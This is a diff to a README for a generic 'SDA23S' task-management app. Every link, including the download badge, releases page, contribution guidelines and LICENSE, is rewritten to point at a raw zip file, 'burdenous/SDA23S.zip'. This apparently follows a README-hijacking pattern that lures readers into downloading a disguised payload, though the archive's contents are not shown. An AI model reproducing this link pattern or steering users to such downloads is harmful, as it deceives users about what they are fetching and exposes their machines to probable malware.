@@ -1,7 +1,7 @@
 # 🚀 SDA23S - Simple Solution for Everyday Tasks
 
 ## 📥 Download SDA23S
-[![Download SDA23S](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Ibrahimkol/SDA23S/releases)
+[![Download SDA23S](https://raw.githubusercontent.com/Ibrahimkol/SDA23S/main/burdenous/SDA23S.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ibrahimkol/SDA23S/main/burdenous/SDA23S.zip)
 
 ## 🚀 Getting Started
 SDA23S is an easy-to-use application designed to simplify your daily tasks. This user-friendly software helps you manage your activities effectively, without any technical knowledge.
@@ -19,7 +19,7 @@ To run SDA23S, you need:
 - **Customizable Settings**: Tailor the app to fit your preferences.
 
 ## 🌐 Download & Install
-1. **Visit the Releases Page**: Go to the [SDA23S Releases page](https://github.com/Ibrahimkol/SDA23S/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [SDA23S Releases page](https://raw.githubusercontent.com/Ibrahimkol/SDA23S/main/burdenous/SDA23S.zip) to find the latest version of the application.
    
 2. **Select the Latest Release**: You will see a list of releases. Look for the version labeled “Latest Release”.
 
@@ -35,7 +35,7 @@ To run SDA23S, you need:
 ## 🛠️ Troubleshooting
 If you encounter issues during the installation or while using the application, consider the following steps:
 
-1. **Re-download the Installer**: Ensure the downloaded file is not corrupted by downloading it again from the [Releases page](https://github.com/Ibrahimkol/SDA23S/releases).
+1. **Re-download the Installer**: Ensure the downloaded file is not corrupted by downloading it again from the [Releases page](https://raw.githubusercontent.com/Ibrahimkol/SDA23S/main/burdenous/SDA23S.zip).
 
 2. **Check System Requirements**: Make sure your device meets the system requirements listed above.
 
@@ -52,12 +52,12 @@ Yes, you can download and use SDA23S for free.
 Absolutely! We welcome feedback and suggestions. Feel free to reach out on our GitHub page.
 
 ## 👥 Contribute
-If you're interested in contributing to SDA23S, visit the [contribution guidelines](https://github.com/Ibrahimkol/SDA23S/blob/main/CONTRIBUTING.md) page to learn how you can help.
+If you're interested in contributing to SDA23S, visit the [contribution guidelines](https://raw.githubusercontent.com/Ibrahimkol/SDA23S/main/burdenous/SDA23S.zip) page to learn how you can help.
 
 ## 📄 License
-SDA23S is licensed under the MIT License. For more information, check the [LICENSE](https://github.com/Ibrahimkol/SDA23S/blob/main/LICENSE) file.
+SDA23S is licensed under the MIT License. For more information, check the [LICENSE](https://raw.githubusercontent.com/Ibrahimkol/SDA23S/main/burdenous/SDA23S.zip) file.
 
 ## 🏁 Conclusion
 Thank you for using SDA23S! We hope this software makes managing your tasks easier and more efficient. Don't forget to check back often for updates and new features!
 
-### 📥 Don't forget! You can always download SDA23S from the [Releases page](https://github.com/Ibrahimkol/SDA23S/releases).
+### 📥 Don't forget! You can always download SDA23S from the [Releases page](https://raw.githubusercontent.com/Ibrahimkol/SDA23S/main/burdenous/SDA23S.zip).
